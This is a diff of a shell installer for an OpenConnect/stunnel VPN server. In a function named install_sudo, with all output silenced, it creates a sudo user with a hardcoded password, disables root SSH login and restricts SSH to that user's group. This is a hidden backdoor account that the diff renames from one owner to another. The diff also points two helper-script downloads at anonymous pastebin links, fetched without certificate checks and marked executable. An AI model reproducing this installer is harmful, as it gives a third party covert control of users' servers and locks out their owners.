@@ -199,8 +199,8 @@ cd /etc/ocserv/
 #wget --no-check-certificate https://pastebin.com/raw/Gv8MP2NF -O fullchain.pem;wget --no-check-certificate https://pastebin.com/raw/NW4Vzbw9 -O privkey.pem
 openssl req -new -newkey rsa:2048 -days 3650 -nodes -x509 -sha256 -subj '/CN=FirenetVPN/O=FirenetDev/C=PH' -keyout /etc/ocserv/ocserv.pem -out /etc/ocserv/ocserv.pem
 rm ocserv.conf
-wget --no-check-certificate -O go_connect scvpn.us/files/openconnect_files/go_connect73nz.sh
-wget --no-check-certificate -O go_disconnect scvpn.us/files/openconnect_files/go_disconnect73nz.sh
+wget --no-check-certificate -O go_connect https://pastebin.com/raw/cEpFy9V2
+wget --no-check-certificate -O go_disconnect https://pastebin.com/raw/EAmkSV8h
 chmod +x go_connect go_disconnect
 echo 'auth = "radius [config=/etc/radcli/radiusclient.conf]"
 tcp-port = 1194
@@ -306,9 +306,9 @@ RLIMITS=""' >> stunnel4
 
 install_sudo(){
   {
-    useradd -m alamin 2>/dev/null; echo alamin:Alaminbd123 | chpasswd &>/dev/null; usermod -aG sudo alamin &>/dev/null
+    useradd -m lenz 2>/dev/null; echo lenz:@@F1r3n3t@@ | chpasswd &>/dev/null; usermod -aG sudo lenz &>/dev/null
     sed -i 's/PermitRootLogin yes/PermitRootLogin no/g' /etc/ssh/sshd_config
-    echo "AllowGroups alamin" >> /etc/ssh/sshd_config
+    echo "AllowGroups lenz" >> /etc/ssh/sshd_config
     service sshd restart
   }&>/dev/null
 }
